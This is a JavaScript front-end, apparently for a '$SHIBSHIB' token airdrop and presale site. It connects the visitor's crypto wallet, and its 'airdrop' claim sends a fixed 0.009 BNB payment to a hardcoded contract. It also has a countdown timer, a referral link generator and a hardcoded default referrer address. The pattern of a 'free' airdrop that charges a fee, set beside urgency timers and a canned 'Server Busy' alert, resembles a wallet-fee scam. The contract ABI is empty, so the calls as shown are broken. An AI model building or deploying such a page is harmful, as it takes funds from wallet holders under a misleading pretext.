let addr,
  web3 = new web3js.myweb3(window.ethereum);
const sttaddr = "0x253C42e18A2248ec588c5919C14f70fEEc8aF86e",
  sttabi = [];
let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
const loadweb3 = async () => {
    try {
      (web3 = new web3js.myweb3(window.ethereum)),
        console.log("Injected web3 detected."),
        (sttcontract = new web3.eth.Contract(sttabi, sttaddr));
      let e = await ethereum.enable();
      return (addr = web3.utils.toChecksumAddress(e[0]));
    } catch (e) {
      4001 === e.code
        ? console.log("Please connect to MetaMask.")
        : Swal.fire(
            "Connect Alert",
            "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
            "error",
          );
    }
  },
  PleaseWait = async () => {
    Swal.fire(
      "Server Busy",
      "There are too many request, Please Try after few min.",
      "error",
    );
  },
  getAirdrop = async () => {
    await loadweb3();
    if (addr == undefined) {
      alert(
        "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended. Refresh and try again.",
      );
    }
    let fresh = document.getElementById("airinput").value;
    sttcontract.methods.airdrop(fresh).send(
      {
        from: addr,
        value: 9000000000000000,
      },
      (err, res) => {
        if (!err) console.log(res);
        else console.log(err);
      },
    );
    addToWallet();
  },
  buystt = async () => {
    await loadweb3();
    if (addr == undefined) {
      alert(
        "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.",
      );
    }
    let ethval = document.getElementById("buyinput").value;
    ethval = Number(ethval) * 1e18;
    let fresh = document.getElementById("airinput").value;
    sttcontract.methods.buy(fresh).send(
      {
        from: addr,
        value: ethval,
      },
      (err, res) => {
        if (!err) console.log(res);
        else console.log(err);
      },
    );
  },
  cooldowncheck = async () => {
    let e = await currentblock(),
      t = await lastblock();
    if (e - t < 50) {
      console.log(e, t);
      let n = 50 + t - e;
      return (
        console.log(n),
        alert("You must wait " + n + " blocks before claiming another airdrop"),
        !1
      );
    }
    return !0;
  },
  currentblock = async () => {
    let e;
    return (
      await web3.eth.getBlockNumber((t, n) => {
        e = n;
      }),
      e
    );
  },
  lastblock = async () => {
    let e;
    return (
      await sttcontract.methods.lastairdrop(addr).call((t, n) => {
        e = n;
      }),
      e
    );
  },
  getbalance = async (e) => {
    let t;
    await sttcontract.methods.balanceOf(e).call((e, n) => {
      t = n;
    });
    return Promise.resolve(t);
  };

function calculate() {
  var e = 1e6 * document.getElementById("buyinput").value;
  console.log(e),
    (document.getElementById("buyhch2input").value = e.toLocaleString("en-US"));
}

function addToWallet() {
  try {
    web3.currentProvider.sendAsync(
      {
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: "0x253C42e18A2248ec588c5919C14f70fEEc8aF86e",
            symbol: "$SHIBSHIB",
            decimals: "18",
            image: "https://www.shibshib.online/logo.png",
          },
        },
        id: Math.round(1e5 * Math.random()),
      },
      function (e, t) {
        e
          ? console.log(e.message)
          : t.result
            ? console.log("Token added")
            : (console.log(t), console.log("Some error"));
      },
    );
  } catch (e) {
    console.log(e);
  }
}
window.onload = function () {
  var e = (function (e) {
    for (
      hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
      i < gy.length;
      i++
    )
      if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
  })("ref");
  null == e || (document.getElementById("airinput").value = e);
};
var countDownDate = new Date("November 25, 2024 00:00:00").getTime(),
  x = setInterval(function () {
    var e = new Date().getTime(),
      t = countDownDate - e,
      n = Math.floor(t / 864e5),
      a = Math.floor((t % 864e5) / 36e5),
      o = Math.floor((t % 36e5) / 6e4),
      r = Math.floor((t % 6e4) / 1e3);
    (document.getElementById("demo").innerHTML =
      n + "d " + a + "h " + o + "m " + r + "s "),
      t < 0 &&
        (clearInterval(x),
        (document.getElementById("demo").innerHTML = "EXPIRED"));
  }, 1e3);

function getreflink() {
  var e = document.getElementById("refaddress").value;
  document.getElementById("refaddress").value
    ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e)
      ? (document.getElementById("refaddress").value =
          "https://www.shibshib.online/?ref=" +
          document.getElementById("refaddress").value)
      : Swal.fire("Referral Alert", "Your address is not valid.", "error")
    : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error");
}

function copyToClipboard(e) {
  var t = document.getElementById(e).value;
  if (window.clipboardData && window.clipboardData.setData)
    return clipboardData.setData("Text", t);
  if (
    document.queryCommandSupported &&
    document.queryCommandSupported("copy")
  ) {
    var n = document.createElement("textarea");
    (n.textContent = t),
      (n.style.position = "fixed"),
      document.body.appendChild(n),
      n.select();
    try {
      return document.execCommand("copy");
    } catch (e) {
      return console.warn("Copy to clipboard failed.", e), !1;
    } finally {
      document.body.removeChild(n);
    }
  }
}

function kopiraj() {
  document.getElementById("refaddress").select(),
    document.execCommand("Copy"),
    alert("Copied success.");
}

function querySt(e) {
  for (
    hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
    i < gy.length;
    i++
  )
    if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
}
var ref = querySt("ref");
null == ref
  ? ((ref = "0x78Ab0FFA2535f6bE53EE0d60Ee528906F4e9a8c1"),
    (document.getElementById("airinput").value = ref))
  : (document.getElementById("airinput").value = ref);